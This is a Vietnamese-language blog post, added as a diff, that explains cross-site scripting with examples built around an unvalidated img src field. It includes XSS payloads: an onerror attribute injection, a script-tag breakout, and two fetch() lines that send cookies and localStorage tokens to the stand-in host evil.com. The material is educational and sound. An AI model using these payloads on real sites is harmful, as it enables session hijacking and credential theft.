@@ -1,0 +1,86 @@
+---
+title: "Một vài điều cần biết về XSS!!"
+publishedAt: "2025-03-30"
+image: "/images/blogs/about-xss/thumbnails.png"
+summary: "Trong bài blog này, mình sẽ giải thích ngắn gọn các khái niệm liên quan và kết hợp với demo để các bạn dễ hình dung."
+tags: ["Security"]
+---
+
+## XSS là gì?
+
+Cross-Site Scripting (XSS) là một lỗ hổng bảo mật phổ biến trong các ứng dụng web, cho phép kẻ tấn công chèn mã độc (thường là JavaScript) vào trang web mà người dùng khác truy cập. Điều này có thể dẫn đến việc đánh cắp thông tin nhạy cảm, chiếm quyền điều khiển phiên làm việc, hoặc thực hiện các hành động thay mặt nạn nhân.
+
+Một ví dụ đơn giản và dễ hiểu: 
+
+Giả sử bạn có một trang web cho phép người dùng thay ảnh đại diện của mình bằng cách nhập URL của ảnh để bạn không cần lưu trữ và xử lý ảnh trên server (hoặc một trường hợp khác tương tự).
+Người dùng có thể nhập URL của ảnh từ một trang web khác, và bạn sẽ render nó như sau:
+
+```html
+<img src="{userInput}" />
+```
+
+
+Kẻ tấn công vô tình biết được điều này và đã lừa người dùng thay avatar của mình bằng một URL độc hại như sau:
+
+```html
+https://example.com/evil.png" onerror="alert('XSS!')
+
+```
+
+`https://example.com/evil.png` là một ảnh không tồn tại, vì vậy trình duyệt sẽ không thể tải được ảnh này và sẽ gọi hàm `onerror` để xử lý lỗi. Trong trường hợp này, hàm `onerror` sẽ thực thi mã JavaScript mà kẻ tấn công đã chèn vào, dẫn đến việc hiển thị thông báo "XSS!".
+
+Thay vì hiển thị thông báo, kẻ tấn công có thể thực hiện các hành động khác như gửi cookie của người dùng đến máy chủ của mình hoặc thực hiện các hành động khác trên trang web mà người dùng đang truy cập.
+
+Bạn nào mà còn lưu API key, token hay cookie trong localStorage hoặc sessionStorage thì không khác gì dâng token cho kẻ tấn công đâu nhé. Ví dụ thay vì `alert('XSS!')`, nếu là:
+
+```html
+fetch('https://evil.com/steal-cookie?cookie=' + document.cookie)
+```
+
+hay: 
+
+
+```html
+fetch('https://evil.com/steal-token?token=' + localStorage.getItem('token'))
+```
+
+thì kẻ tấn công đã có thể lấy được cookie hay token của người dùng rồi.
+
+---
+
+## Các loại XSS phổ biến
+
+1. **Stored XSS (XSS lưu trữ)**  
+   Mã độc được lưu trữ vĩnh viễn trên máy chủ (ví dụ: trong cơ sở dữ liệu) và được thực thi khi người dùng truy cập trang bị ảnh hưởng.
+
+2. **Reflected XSS (XSS phản chiếu)**  
+   Mã độc được phản chiếu từ máy chủ, thường thông qua URL hoặc input form, và được thực thi trong trình duyệt của nạn nhân.
+
+3. **DOM-based XSS**  
+   Lỗ hổng tồn tại trong mã phía client, nơi trình duyệt thực thi mã độc do việc thao tác không an toàn với DOM.
+
+---
+
+## XSS có thể được thực hiện qua những cách nào?
+
+### Ví dụ kịch bản tấn công XSS thông qua src của thẻ img
+
+Ứng dụng web của bạn cho phép người dùng nhập URL ảnh để hiển thị (ví dụ: ảnh đại diện, ảnh sản phẩm), và bạn render nó như sau:
+
+```html
+<img src="{userInput}" />
+
+```
+
+Nếu không validate kĩ userInput, kẻ tấn công có thể gửi:
+```html
+"><script>alert('XSS')</script>
+
+```
+
+Khi đó, thẻ `<img>` sẽ không được render thành:
+```html
+<img src=""><script>alert('XSS')</script> />
+
+```
+Và mã JavaScript sẽ được thực thi, dẫn đến việc hiển thị thông báo "XSS".
